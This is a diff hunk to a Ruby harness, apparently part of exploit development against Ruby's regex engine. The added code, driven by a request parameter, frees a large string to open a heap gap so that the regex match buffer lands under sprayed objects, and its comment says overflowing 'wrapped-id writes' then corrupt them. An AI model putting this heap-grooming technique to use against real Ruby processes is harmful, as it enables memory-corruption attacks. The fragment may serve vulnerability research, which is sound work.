@@ -45,6 +45,16 @@ begin
       sprayed = Array.new(Integer(ps)) { 'p' * 10 }
       GC.start
     end
+    if (anchor = req['anchor'])
+      # freed mmap hole directly below the newest heap page: the engine's
+      # match buffer takes the top of this gap at match time (top-down
+      # placement), landing directly under the page — or a fresh GC page
+      # takes the gap and the buffer lands under THAT page. Either way the
+      # wrapped-id writes reach sprayed RVALUEs.
+      a = 'A' * Integer(anchor)
+      a = nil
+      GC.start
+    end
     Regexp.timeout = Float(req['timeout']) if req['timeout']
     result = nil
     begin
